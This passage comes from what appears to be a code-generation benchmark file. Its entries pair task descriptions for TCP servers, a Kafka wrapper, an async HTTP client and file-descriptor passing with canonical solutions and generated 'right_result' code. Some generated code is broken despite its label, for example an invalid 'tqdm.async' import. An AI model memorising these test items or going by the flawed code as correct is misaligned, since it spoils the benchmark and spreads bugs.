    "Instruction": "Task Description: Create a Python function that implements a TCP server which listens for client connections and sends the current server time upon connection.\n\nFunction Description: The function sets up a TCP server socket using IPv4, binds it to a specified IP address and port, listens for incoming connections, and sends the current datetime to each connected client before closing the connection. The server runs indefinitely until manually stopped.\n\nInput: None\n\nOutput: None (The function runs indefinitely, printing connection messages to console and sending datetime to clients)",
    "Canonical_solution": "from socket import socket, SOCK_STREAM, AF_INET\nfrom datetime import datetime\n\ndef main():\n    server = socket(family=AF_INET, type=SOCK_STREAM)\n    server.bind(('192.168.1.2', 6789))\n    server.listen(512)\n    print('\u670d\u52a1\u5668\u542f\u52a8\u5f00\u59cb\u76d1\u542c...')\n    while True:\n        client, addr = server.accept()\n        print(str(addr) + '\u8fde\u63a5\u5230\u4e86\u670d\u52a1\u5668.')\n        client.send(str(datetime.now()).encode('utf-8'))\n        client.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport datetime\n\ndef start_tcp_server():\n    host = '0.0.0.0'  # Bind to all available interfaces\n    port = 12345      # Arbitrary port number\n\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:\n        server_socket.bind((host, port))\n        server_socket.listen(5)\n        print(f\"Server listening on {host}:{port}...\")\n\n        while True:\n            client_socket, client_address = server_socket.accept()\n            print(f\"Connection from {client_address}\")\n            current_time = datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n            client_socket.sendall(current_time.encode('utf-8'))\n            client_socket.close()"
  },
  {
    "Task_id": 398,
    "Instruction": "Task Description: Implement a TCP server function that handles client connections, performs data exchange, and measures performance statistics during the exchange.\n\nFunction Description: The function `server_once` establishes a TCP server that listens for incoming client connections, exchanges parameters with the client, performs data transfer (either sending or receiving based on parameters), collects performance statistics, exchanges results with the client, and finally closes the connection. The function handles both TCP and UDP protocols based on client parameters and includes debugging capabilities.\n\nInput: \n- None (The function uses global constants and variables for configuration)\n  - DEBUG: bool - Flag to enable debug output\n  - COOKIE_SIZE: int - Size of the cookie for client verification\n  - PARAM_EXCHANGE, CREATE_STREAMS, TEST_START, TEST_RUNNING, TEST_END, EXCHANGE_RESULTS, DISPLAY_RESULTS, IPERF_DONE: int - Command codes for protocol control\n\nOutput: \n- None (The function performs operations and outputs results to console/logs but doesn't return any value)\n  - Prints server status and debug information to console\n  - Outputs performance statistics when complete",
    "Canonical_solution": "import json\nimport select\nimport socket\nimport struct\nimport time\n\ndef server_once():\n    # Listen for a connection\n    ai = socket.getaddrinfo(\"0.0.0.0\", 5201)\n    ai = ai[0]\n    print(\"Server listening on\", ai[-1])\n    s_listen = socket.socket(ai[0], socket.SOCK_STREAM)\n    s_listen.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s_listen.bind(ai[-1])\n    s_listen.listen(1)\n    s_ctrl, addr = s_listen.accept()\n\n    # Read client's cookie\n    cookie = recvn(s_ctrl, COOKIE_SIZE)\n    if DEBUG:\n        print(cookie)\n\n    # Ask for parameters\n    s_ctrl.sendall(bytes([PARAM_EXCHANGE]))\n\n    # Get parameters\n    n = struct.unpack(\">I\", recvn(s_ctrl, 4))[0]\n    param = recvn(s_ctrl, n)\n    param = json.loads(str(param, \"ascii\"))\n    if DEBUG:\n        print(param)\n    reverse = param.get(\"reverse\", False)\n\n    # Ask to create streams\n    s_ctrl.sendall(bytes([CREATE_STREAMS]))\n\n    if param.get(\"tcp\", False):\n        # Accept stream\n        s_data, addr = s_listen.accept()\n        print(\"Accepted connection:\", addr)\n        recvn(s_data, COOKIE_SIZE)\n    elif param.get(\"udp\", False):\n        # Close TCP connection and open UDP \"connection\"\n        s_listen.close()\n        s_data = socket.socket(ai[0], socket.SOCK_DGRAM)\n        s_data.bind(ai[-1])\n        data, addr = s_data.recvfrom(4)\n        s_data.sendto(b\"\\x12\\x34\\x56\\x78\", addr)\n    else:\n        assert False\n\n    # Start test\n    s_ctrl.sendall(bytes([TEST_START]))\n\n    # Run test\n    s_ctrl.sendall(bytes([TEST_RUNNING]))\n\n    # Read data, and wait for client to send TEST_END\n    poll = select.poll()\n    poll.register(s_ctrl, select.POLLIN)\n    if reverse:\n        poll.register(s_data, select.POLLOUT)\n    else:\n        poll.register(s_data, select.POLLIN)\n    stats = Stats(param)\n    stats.start()\n    running = True\n    data_buf = bytearray(urandom(param[\"len\"]))\n    while running:\n        for pollable in poll.poll(stats.max_dt_ms()):\n            if pollable_is_sock(pollable, s_ctrl):\n                cmd = recvn(s_ctrl, 1)[0]\n                if DEBUG:\n                    print(cmd_string.get(cmd, \"UNKNOWN_COMMAND\"))\n                if cmd == TEST_END:\n                    running = False\n            elif pollable_is_sock(pollable, s_data):\n                if reverse:\n                    n = s_data.send(data_buf)\n                    stats.add_bytes(n)\n                else:\n                    recvninto(s_data, data_buf)\n                    stats.add_bytes(len(data_buf))\n        stats.update()\n\n    # Need to continue writing so other side doesn't get blocked waiting for data\n    if reverse:\n        while True:\n            for pollable in poll.poll(0):\n                if pollable_is_sock(pollable, s_data):\n                    s_data.send(data_buf)\n                    break\n            else:\n                break\n\n    stats.stop()\n\n    # Ask to exchange results\n    s_ctrl.sendall(bytes([EXCHANGE_RESULTS]))\n\n    # Get client results\n    n = struct.unpack(\">I\", recvn(s_ctrl, 4))[0]\n    results = recvn(s_ctrl, n)\n    results = json.loads(str(results, \"ascii\"))\n    if DEBUG:\n        print(results)\n\n    # Send our results\n    results = {\n        \"cpu_util_total\": 1,\n        \"cpu_util_user\": 0.5,\n        \"cpu_util_system\": 0.5,\n        \"sender_has_retransmits\": 1,\n        \"congestion_used\": \"cubic\",\n        \"streams\": [\n            {\n                \"id\": 1,\n                \"bytes\": stats.nb0,\n                \"retransmits\": 0,\n                \"jitter\": 0,\n                \"errors\": 0,\n                \"packets\": stats.np0,\n                \"start_time\": 0,\n                \"end_time\": ticks_diff(stats.t3, stats.t0) * 1e-6,\n            }\n        ],\n    }\n    results = json.dumps(results)\n    s_ctrl.sendall(struct.pack(\">I\", len(results)))\n    s_ctrl.sendall(bytes(results, \"ascii\"))\n\n    # Ask to display results\n    s_ctrl.sendall(bytes([DISPLAY_RESULTS]))\n\n    # Wait for client to send IPERF_DONE\n    cmd = recvn(s_ctrl, 1)[0]\n    assert cmd == IPERF_DONE\n\n    # Close all sockets\n    s_data.close()\n    s_ctrl.close()\n    s_listen.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport time\nimport logging\nimport threading\n\nDEBUG = True\nCOOKIE_SIZE = 32\nPARAM_EXCHANGE = 1\nCREATE_STREAMS = 2\nTEST_START = 3\nTEST_RUNNING = 4\nTEST_END = 5\nEXCHANGE_RESULTS = 6\nDISPLAY_RESULTS = 7\nIPERF_DONE = 8\n\ndef server_once():\n    logging.basicConfig(level=logging.DEBUG if DEBUG else logging.INFO)\n    host = '0.0.0.0'\n    port = 12345\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.bind((host, port))\n    sock.listen(1)\n    logging.info(\"Server started on %s:%d\", host, port)\n\n    try:\n        client_socket, addr = sock.accept()\n        logging.info(\"Connection from %s\", addr)\n\n        # Cookie exchange\n        cookie = b'\\x00' * COOKIE_SIZE\n        client_socket.sendall(cookie)\n        received_cookie = client_socket.recv(COOKIE_SIZE)\n        if received_cookie != cookie:\n            logging.warning(\"Cookie mismatch\")\n            client_socket.close()\n            return\n\n        # Parameter exchange\n        client_socket.sendall(b'PARAM_EXCHANGE')\n        client_socket.recv(1)  # Acknowledge\n        command = int(client_socket.recv(1))\n        if command == PARAM_EXCHANGE:\n            logging.debug(\"Received PARAM_EXCHANGE command\")\n        elif command == CREATE_STREAMS:\n            logging.debug(\"Received CREATE_STREAMS command\")\n        elif command == TEST_START:\n            logging.debug(\"Received TEST_START command\")\n        elif command == TEST_RUNNING:\n            logging.debug(\"Received TEST_RUNNING command\")\n        elif command == TEST_END:\n            logging.debug(\"Received TEST_END command\")\n        elif command == EXCHANGE_RESULTS:\n            logging.debug(\"Received EXCHANGE_RESULTS command\")\n        elif command == DISPLAY_RESULTS:\n            logging.debug(\"Received DISPLAY_RESULTS command\")\n        elif command == IPERF_DONE:\n            logging.debug(\"Received IPERF_DONE command\")\n        else:\n            logging.warning(\"Unknown command: %d\", command)\n\n        # Performance statistics\n        start_time = time.time()\n        data = b'A' * 1024\n        for _ in range(1000):\n            client_socket.sendall(data)\n            received = client_socket.recv(len(data))\n            if received != data:\n                logging.warning(\"Data mismatch\")\n                break\n        end_time = time.time()\n        duration = end_time - start_time\n        throughput = (len(data) * 1000) / duration  # in bytes per second\n\n        # Exchange results\n        client_socket.sendall(b'EXCHANGE_RESULTS')\n        client_socket.recv(1)  # Acknowledge\n        client_socket.sendall(str(throughput).encode())\n        client_socket.recv(1)  # Acknowledge\n\n        # Display results\n        client_socket.sendall(b'DISPLAY_RESULTS')\n        client_socket.recv(1)  # Acknowledge\n        client_socket.sendall(str(throughput).encode())\n        client_socket.recv(1)  # Acknowledge\n\n        # End test\n        client_socket.sendall(b'TEST_END')\n        client_socket.recv(1)  # Acknowledge\n\n        logging.info(\"Test completed. Throughput: %.2f B/s\", throughput)\n    except Exception as e:\n        logging.error(\"Error: %s\", str(e))\n    finally:\n        client_socket.close()\n        sock.close()"
  },
  {
    "Task_id": 399,
    "Instruction": "Task Description: Create a TCP socket server class in Python that can handle incoming client connections, receive and process data, and send responses back to clients. The server should include error handling and callback methods for various events during its lifecycle.\n\nClass Description: MySocketServer is a TCP server implementation that listens on a specified host and port, accepts client connections, and handles data exchange. It provides hooks for custom behavior during different stages of server operation (startup, connection acceptance, data processing, etc.).\n\nAttributes:\n- host: str - The IP address or hostname to bind the server to\n- port: int - The port number to listen on\n- name: str - A descriptive name for the server (default: 'SocketServer')\n- numListen: int - Maximum number of queued connections (default: 1)\n- sock: socket.socket - The server socket object\n\nMethods:\n- __init__(host, port, name='SocketServer', numListen=1) -> None - Initializes the server with connection parameters\n- Run() -> None - Starts the server, binds to the specified address, and begins listening for connections\n- Stop() -> None - Stops the server by sending a special command to itself\n- onAccept(sock, addr) -> None - Handles a new client connection (sock: connection socket, addr: client address)\n- onData(sock, addr, data) -> None - Processes received data and sends a response (sock: connection socket, addr: client address, data: received bytes)\n- response(data) -> bytes - Generates a response for received data (data: input bytes) -> returns response bytes\n- onStartFail(e) -> None - Callback when server fails to start (e: exception object)\n- onStart() -> None - Callback when server starts successfully\n- onAcceptError(e) -> None - Callback when connection acceptance fails (e: exception object)\n- onRecvError(sock, addr, e) -> None - Callback when data receiving fails (sock: connection socket, addr: client address, e: exception object)\n- onSendError(sock, addr, e) -> None - Callback when data sending fails (sock: connection socket, addr: client address, e: exception object)\n- onStop() -> None - Callback when server stops\n\nStatic Methods:\n- Query(host, port, req) -> bytes - Helper function to send a request to a server and get response (host: target host, port: target port, req: request bytes) -> returns response bytes",
    "Canonical_solution": "import socket\nfrom qqbot.utf8logger import INFO, ERROR\nfrom qqbot.common import STR2BYTES\n\nclass MySocketServer:\n    def __init__(self, host, port, name='SocketServer', numListen=1):\n        self.host = host\n        self.port = int(port)\n        self.name = name\n        self.numListen = numListen\n\n    def Run(self):\n        try:\n            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            self.sock.bind((self.host, self.port))\n            self.sock.listen(self.numListen)\n            self.sock.settimeout(None)\n        except socket.error as e:\n            ERROR('\u65e0\u6cd5\u5f00\u542f %s \uff0c %s', self.name, e)\n            self.onStartFail(e)\n        else:\n            INFO('\u5df2\u5728 %s \u7684 %s \u7aef\u53e3\u5f00\u542f %s', self.host, self.port, self.name)\n            self.onStart()\n            while True:\n                try:\n                    sock, addr = self.sock.accept()\n                except socket.error as e:\n                    ERROR('%s \u53d1\u751f accept \u9519\u8bef\uff0c%s', self.name, e)\n                    self.onAcceptError(e)\n                else:\n                    self.onAccept(sock, addr)\n\n    def onAccept(self, sock, addr):\n        sock.settimeout(10.0)\n        try:\n            data = sock.recv(8192)\n        except socket.error as e:\n            ERROR('%s \u5728\u63a5\u6536\u6765\u81ea %s:%s \u7684\u6570\u636e\u65f6\u53d1\u9001\u9519\u8bef\uff0c%s', self.name, addr[0], addr[1], e)\n            self.onRecvError(sock, addr, e)\n            sock.close()\n        else:\n            if data == b'##STOP':\n                INFO('%s \u5df2\u505c\u6b62', self.name)\n                self.onStop()\n                sys.exit(0)\n            else:\n                self.onData(sock, addr, data)\n\n    def Stop(self):\n        Query(self.host, self.port, b'##STOP')\n\n    def onData(self, sock, addr, data):\n        try:\n            resp = self.response(data)\n        except Exception as e:\n            resp = '%s \u5728\u5904\u7406 %s:%s \u7684\u8bf7\u6c42\u65f6\u53d1\u751f\u9519\u8bef\uff0c%s' % (self.name, addr[0], addr[1], e)\n            ERROR(resp, exc_info=True)\n            resp = STR2BYTES(resp)\n\n        try:\n            sock.sendall(resp)\n        except socket.error as e:\n            ERROR('%s \u5728\u5411 %s:%s \u53d1\u9001\u6570\u636e\u65f6\u53d1\u9001\u9519\u8bef\uff0c%s', self.name, addr[0], addr[1], e)\n            self.onSendError(sock, addr, data)\n        finally:\n            sock.close()\n\n    def onStartFail(self, e):\n        pass\n\n    def onStart(self):\n        pass\n\n    def onAcceptError(self, e):\n        pass\n\n    def onRecvError(self, sock, addr, e):\n        pass\n\n    def onSendError(self, sock, addr, e):\n        pass\n\n    def onStop(self):\n        pass\n\n    def response(self, data):\n        return b'Hello, ' + data\n\ndef Query(host, port, req):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    resp = b''\n    try:\n        sock.connect((host, int(port)))\n        sock.sendall(req)\n        while True:\n            data = sock.recv(8096)\n            if not data:\n                return resp\n            else:\n                resp += data\n    except socket.error:\n        return resp\n    finally:\n        sock.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport threading\n\nclass MySocketServer:\n    def __init__(self, host, port, name='SocketServer', numListen=1):\n        self.host = host\n        self.port = port\n        self.name = name\n        self.numListen = numListen\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.clients = []\n\n    def Run(self):\n        try:\n            self.sock.bind((self.host, self.port))\n            self.sock.listen(self.numListen)\n            self.onStart()\n            while True:\n                try:\n                    client_sock, addr = self.sock.accept()\n                    self.clients.append(client_sock)\n                    self.onAccept(client_sock, addr)\n                except Exception as e:\n                    self.onAcceptError(e)\n        except Exception as e:\n            self.onStartFail(e)\n\n    def Stop(self):\n        for client in self.clients:\n            client.close()\n        self.sock.close()\n        self.onStop()\n\n    def onAccept(self, sock, addr):\n        pass\n\n    def onData(self, sock, addr, data):\n        try:\n            response = self.response(data)\n            sock.sendall(response)\n        except Exception as e:\n            self.onSendError(sock, addr, e)\n\n    def response(self, data):\n        return data[::-1]\n\n    def onStartFail(self, e):\n        pass\n\n    def onStart(self):\n        pass\n\n    def onAcceptError(self, e):\n        pass\n\n    def onRecvError(self, sock, addr, e):\n        pass\n\n    def onSendError(self, sock, addr, e):\n        pass\n\n    def onStop(self):\n        pass\n\n    @staticmethod\n    def Query(host, port, req):\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.connect((host, port))\n            sock.sendall(req)\n            response = sock.recv(4096)\n            sock.close()\n            return response\n        except Exception as e:\n            return str(e).encode()"
  },
  {
    "Task_id": 4,
    "Instruction": "Task Description: Create an asynchronous Kafka environment class for inter-process communication that can both consume and produce messages using aiokafka.\n\nClass Description: AsyncKafkaEnvironment is a class that provides asynchronous Kafka message consumption and production capabilities. It handles initialization of Kafka consumers and producers, message sending, batch data retrieval, and proper resource cleanup.\n\nAttributes:\nkafka_bootstrap_servers: Optional[Union[str, List[str]]] - Kafka broker addresses as string or list of strings\nkafka_input_topic: Optional[str] - Topic name for consuming messages\nkafka_output_topic: Optional[str] - Topic name for producing messages\ntimeout_ms: Optional[int] - Timeout in milliseconds for consumer operations\nconsumer: Optional[AIOKafkaConsumer] - Async Kafka consumer instance\nproducer: Optional[AIOKafkaProducer] - Async Kafka producer instance\n\nMethods:\ninitialize() -> None - Initializes the Kafka consumer and producer instances with configured settings. Validates required attributes are set before initialization.\nfinalize() -> None - Gracefully stops both consumer and producer instances to clean up resources.\nmessage_sender(producer: AIOKafkaProducer, data: Iterable, topic: str) -> None - Sends data to specified Kafka topic using the provided producer instance.\nget_data_batch(batch_size: Optional[int]) -> list - Retrieves a batch of messages from the input topic, with optional size limit. Returns list of message values.",
    "Canonical_solution": "import logging\nimport json\nfrom typing import Union, List, Optional, Iterable\nfrom aiokafka import AIOKafkaConsumer, AIOKafkaProducer\n\nlogger = logging.getLogger(__name__)\n\nclass AsyncKafkaEnvironment:\n    \"\"\"\n    Represents an asynchronous Kafka environment for inter-process communication.\n    \"\"\"\n    \n    kafka_bootstrap_servers: Optional[Union[str, List[str]]] = None\n    kafka_input_topic: Optional[str] = None\n    kafka_output_topic: Optional[str] = None\n    timeout_ms: Optional[int] = None\n    consumer: Optional[AIOKafkaConsumer] = None\n    producer: Optional[AIOKafkaProducer] = None\n\n    async def initialize(self):\n        assert self.kafka_bootstrap_servers is not None, \"missing initialization for kafka_bootstrap_servers\"\n        assert self.kafka_input_topic is not None, \"missing initialization for kafka_input_topic\"\n        assert self.kafka_output_topic is not None, \"missing initialization for kafka_output_topic\"\n        assert self.timeout_ms is not None, \"missing initialization for timeout_ms\"\n\n        self.consumer = AIOKafkaConsumer(\n            self.kafka_input_topic,\n            bootstrap_servers=self.kafka_bootstrap_servers,\n            value_deserializer=lambda v: json.loads(v.decode(\"utf-8\")),\n            auto_offset_reset=\"earliest\",\n            max_partition_fetch_bytes=3000000,\n        )\n        await self.consumer.start()\n\n        self.producer = AIOKafkaProducer(\n            bootstrap_servers=self.kafka_bootstrap_servers,\n            value_serializer=lambda v: json.dumps(v).encode(\"utf-8\"),\n            max_request_size=3000000,\n            acks=\"all\",\n        )\n        await self.producer.start()\n\n    async def finalize(self):\n        if self.consumer:\n            await self.consumer.stop()\n        if self.producer:\n            await self.producer.stop()\n\n    async def message_sender(self, producer: AIOKafkaProducer, data: Iterable, topic: str):\n        try:\n            await producer.send_and_wait(topic, value=data)\n            logger.info(f\"The number of records sent to topic:{topic}, record_no:{len(data)}\")\n        finally:\n            pass\n\n    async def get_data_batch(self, batch_size: Optional[int]) -> list:\n        batch = await self.consumer.getmany(\n            timeout_ms=self.timeout_ms, max_records=batch_size\n        )\n\n        if len(batch) == 0:\n            batch_data = []\n        elif len(batch) > 1:\n            logger.error(\n                f\"consumer should be subscribed to only one topic and partition, not {list(batch.keys())}\"\n            )\n            batch_data = []\n        else:\n            for topic_partition, messages in batch.items():\n                batch_data = [msg.value for msg in messages]\n\n            logger.info(\n                f\"Received a batch with number_of_messages:{len(batch_data)} records from Kafka input_topic:{self.kafka_input_topic}\"\n            )\n        return batch_data",
    "Code_level": "Class-level",
    "FSMID_for_test": 80,
    "right_result": "import aiokafka\nfrom typing import Optional, Union, Iterable, List\n\nclass AsyncKafkaEnvironment:\n    def __init__(self, kafka_bootstrap_servers: Optional[Union[str, List[str]]] = None,\n                 kafka_input_topic: Optional[str] = None,\n                 kafka_output_topic: Optional[str] = None,\n                 timeout_ms: Optional[int] = 10000):\n        self.kafka_bootstrap_servers = kafka_bootstrap_servers\n        self.kafka_input_topic = kafka_input_topic\n        self.kafka_output_topic = kafka_output_topic\n        self.timeout_ms = timeout_ms\n        self.consumer: Optional[aiokafka.AIOKafkaConsumer] = None\n        self.producer: Optional[aiokafka.AIOKafkaProducer] = None\n\n    async def initialize(self) -> None:\n        if not self.kafka_bootstrap_servers or not self.kafka_input_topic or not self.kafka_output_topic:\n            raise ValueError(\"Kafka bootstrap servers, input topic, and output topic must be provided\")\n\n        self.producer = aiokafka.AIOKafkaProducer(bootstrap_servers=self.kafka_bootstrap_servers)\n        await self.producer.start()\n\n        self.consumer = aiokafka.AIOKafkaConsumer(bootstrap_servers=self.kafka_bootstrap_servers,\n                                                 group_id='my-group',\n                                                 auto_offset_reset='earliest',\n                                                 enable_auto_commit=False,\n                                                 timeout_ms=self.timeout_ms)\n        await self.consumer.start()\n\n    async def finalize(self) -> None:\n        if self.producer:\n            await self.producer.stop()\n        if self.consumer:\n            await self.consumer.stop()\n\n    async def message_sender(self, data: Iterable, topic: str) -> None:\n        if not self.producer:\n            raise ValueError(\"Producer not initialized\")\n        await self.producer.send(topic=topic, value=data)\n\n    async def get_data_batch(self, batch_size: Optional[int] = None) -> List:\n        if not self.consumer:\n            raise ValueError(\"Consumer not initialized\")\n        messages = []\n        async for msg in self.consumer:\n            messages.append(msg.value)\n            if batch_size and len(messages) >= batch_size:\n                break\n        return messages"
  },
  {
    "Task_id": 40,
    "Instruction": "Task Description: Create an asynchronous HTTP client class in Python using httpx and asyncio libraries to perform various HTTP operations including GET, POST, file downloads, and image retrieval with progress tracking and error handling.\n\nClass Description: AsyncHTTPClient is a utility class that provides static methods for performing asynchronous HTTP operations. It handles common HTTP methods, file downloads with progress tracking, and image retrieval/saving functionality.\n\nMethods:\n\nMethod1: get(url: str, *, headers: Optional[Dict[str, str]] = None, params: Optional[Dict[str, Any]] = None, timeout: Optional[int] = 20, **kwargs) -> httpx.Response\n- Performs an asynchronous HTTP GET request to the specified URL with optional headers, query parameters, and timeout. Returns the HTTP response.\n\nMethod2: post(url: str, *, headers: Optional[Dict[str, str]] = None, params: Optional[Dict[str, Any]] = None, data: Optional[Dict[str, Any]] = None, json: Optional[Dict[str, Union[Any, str]]] = None, timeout: Optional[int] = 20, **kwargs) -> httpx.Response\n- Performs an asynchronous HTTP POST request to the specified URL with optional headers, query parameters, form data, JSON payload, and timeout. Returns the HTTP response.\n\nMethod3: download(url: str, save_path: Path, exclude_json: bool = False) -> None\n- Downloads a file from the specified URL asynchronously with progress tracking. Saves to the specified path while optionally excluding JSON content. Raises exception if content type doesn't match.\n\nMethod4: get_img(url: str, *, headers: Optional[Dict[str, str]] = None, params: Optional[Dict[str, Any]] = None, timeout: Optional[int] = 20, save_path: Optional[Union[str, Path]] = None, **kwargs) -> Union[None, Image.Image]\n- Retrieves an image from the specified URL asynchronously. Can optionally save to disk and returns a PIL Image object or None if the content isn't an image.",
    "Canonical_solution": "import httpx\nfrom typing import Dict, Optional, Any, Union\nfrom pathlib import Path\nfrom io import BytesIO\nfrom PIL import Image\nimport tqdm.asyncio\n\nclass AsyncHTTPClient:\n    @staticmethod\n    async def get(url: str,\n                 *,\n                 headers: Optional[Dict[str, str]] = None,\n                 params: Optional[Dict[str, Any]] = None,\n                 timeout: Optional[int] = 20,\n                 **kwargs) -> httpx.Response:\n        async with httpx.AsyncClient() as client:\n            return await client.get(url,\n                                  headers=headers,\n                                  params=params,\n                                  timeout=timeout,\n                                  **kwargs)\n\n    @staticmethod\n    async def post(url: str,\n                  *,\n                  headers: Optional[Dict[str, str]] = None,\n                  params: Optional[Dict[str, Any]] = None,\n                  data: Optional[Dict[str, Any]] = None,\n                  json: Optional[Dict[str, Union[Any, str]]] = None,\n                  timeout: Optional[int] = 20,\n                  **kwargs) -> httpx.Response:\n        async with httpx.AsyncClient() as client:\n            return await client.post(url,\n                                   headers=headers,\n                                   params=params,\n                                   data=data,\n                                   json=json,\n                                   timeout=timeout,\n                                   **kwargs)\n\n    @staticmethod\n    async def download(url: str, save_path: Path, exclude_json: bool = False):\n        save_path.parent.mkdir(parents=True, exist_ok=True)\n        async with httpx.AsyncClient().stream(method='GET', url=url, follow_redirects=True) as datas:\n            if exclude_json and 'application/json' in str(datas.headers['Content-Type']):\n                raise Exception('file not match type')\n            size = int(datas.headers['Content-Length'])\n            f = save_path.open('wb')\n            async for chunk in tqdm.asyncio.tqdm(iterable=datas.aiter_bytes(1),\n                                               desc=url.split('/')[-1],\n                                               unit='iB',\n                                               unit_scale=True,\n                                               unit_divisor=1024,\n                                               total=size,\n                                               colour='green'):\n                f.write(chunk)\n            f.close()\n\n    @staticmethod\n    async def get_img(url: str,\n                     *,\n                     headers: Optional[Dict[str, str]] = None,\n                     params: Optional[Dict[str, Any]] = None,\n                     timeout: Optional[int] = 20,\n                     save_path: Optional[Union[str, Path]] = None,\n                     **kwargs) -> Union[None, Image.Image]:\n        if save_path and Path(save_path).exists():\n            return Image.open(save_path)\n        \n        async with httpx.AsyncClient() as client:\n            resp = await client.get(url,\n                                  headers=headers,\n                                  params=params,\n                                  timeout=timeout,\n                                  **kwargs)\n            if resp.headers.get('Content-Type') not in ['image/png', 'image/jpeg']:\n                return None\n            resp = resp.read()\n            img = Image.open(BytesIO(resp))\n            \n            if save_path:\n                save_path = Path(save_path)\n                save_path.parent.mkdir(parents=True, exist_ok=True)\n                img.save(save_path)\n            return img",
    "Code_level": "Class-level",
    "FSMID_for_test": 59,
    "right_result": "import httpx\nfrom typing import Optional, Dict, Any, Union, Path, Tuple\nfrom PIL import Image\nfrom tqdm.async import async_tqdm\nimport os\n\nclass AsyncHTTPClient:\n    @staticmethod\n    async def get(url: str, *, headers: Optional[Dict[str, str]] = None, params: Optional[Dict[str, Any]] = None, timeout: Optional[int] = 20, **kwargs) -> httpx.Response:\n        async with httpx.AsyncClient() as client:\n            response = await client.get(url, headers=headers, params=params, timeout=timeout, **kwargs)\n            return response\n\n    @staticmethod\n    async def post(url: str, *, headers: Optional[Dict[str, str]] = None, params: Optional[Dict[str, Any]] = None, data: Optional[Dict[str, Any]] = None, json: Optional[Dict[str, Union[Any, str]]] = None, timeout: Optional[int] = 20, **kwargs) -> httpx.Response:\n        async with httpx.AsyncClient() as client:\n            response = await client.post(url, headers=headers, params=params, data=data, json=json, timeout=timeout, **kwargs)\n            return response\n\n    @staticmethod\n    async def download(url: str, save_path: Path, exclude_json: bool = False) -> None:\n        try:\n            async with httpx.AsyncClient() as client:\n                response = await client.get(url, timeout=20)\n                if not response.is_success:\n                    raise ValueError(f\"Request failed with status code {response.status_code}\")\n                \n                content_type = response.headers.get('content-type', '')\n                if not exclude_json and 'application/json' in content_type:\n                    raise ValueError(\"Content type is JSON, which is not a file.\")\n                \n                total_size = int(response.headers.get('content-length', 0))\n                with open(save_path, 'wb') as f:\n                    async for chunk in response.aiter_bytes():\n                        if total_size > 0:\n                            bytes_downloaded = f.tell()\n                            percent = bytes_downloaded / total_size * 100\n                            print(f\"Downloaded {bytes_downloaded} of {total_size} bytes ({percent:.2f}%)\")\n                        f.write(chunk)\n        except Exception as e:\n            print(f\"Error downloading file: {e}\")\n\n    @staticmethod\n    async def get_img(url: str, *, headers: Optional[Dict[str, str]] = None, params: Optional[Dict[str, Any]] = None, timeout: Optional[int] = 20, save_path: Optional[Union[str, Path]] = None, **kwargs) -> Union[None, Image.Image]:\n        try:\n            async with httpx.AsyncClient() as client:\n                response = await client.get(url, headers=headers, params=params, timeout=timeout, **kwargs)\n                if not response.is_success:\n                    raise ValueError(f\"Request failed with status code {response.status_code}\")\n                \n                content_type = response.headers.get('content-type', '')\n                if 'image/' not in content_type:\n                    return None\n                \n                image = Image.open(await response.read())\n                if save_path:\n                    os.makedirs(os.path.dirname(save_path), exist_ok=True)\n                    image.save(save_path)\n                return image\n        except Exception as e:\n            print(f\"Error retrieving image: {e}\")\n            return None"
  },
  {
    "Task_id": 400,
    "Instruction": "Task Description: Implement a TCP server that accepts client connections and forwards their file descriptors to a worker process over a Unix domain socket.\n\nFunction Description: The code consists of two main functions. `send_fd()` handles sending a file descriptor over a Unix domain socket, while `server()` sets up both the Unix domain socket for worker communication and the TCP server for client connections. The server continuously accepts TCP clients, sends their file descriptors to the worker, and closes the client connection.\n\nInput:\n- `send_fd()`:\n  - `sock`: [socket.socket] - A connected Unix domain socket\n  - `fd`: [int] - File descriptor to send\n- `server()`:\n  - `work_address`: [str] - Path for the Unix domain socket\n  - `port`: [int] - TCP port number to listen on\n\nOutput:\n- `send_fd()`: None (but expects 'OK' acknowledgment from receiver)\n- `server()`: None (runs indefinitely serving clients)",
    "Canonical_solution": "import socket\nimport struct\n\ndef send_fd(sock, fd):\n    '''\n    Send a single file descriptor.\n    '''\n    sock.sendmsg([b'x'],\n                 [(socket.SOL_SOCKET, socket.SCM_RIGHTS, struct.pack('i', fd))])\n    ack = sock.recv(2)\n    assert ack == b'OK'\n\ndef server(work_address, port):\n    # Wait for the worker to connect\n    work_serv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n    work_serv.bind(work_address)\n    work_serv.listen(1)\n    worker, addr = work_serv.accept()\n\n    # Now run a TCP/IP server and send clients to worker\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)\n    s.bind(('',port))\n    s.listen(1)\n    while True:\n        client, addr = s.accept()\n        print('SERVER: Got connection from', addr)\n        send_fd(worker, client.fileno())\n        client.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
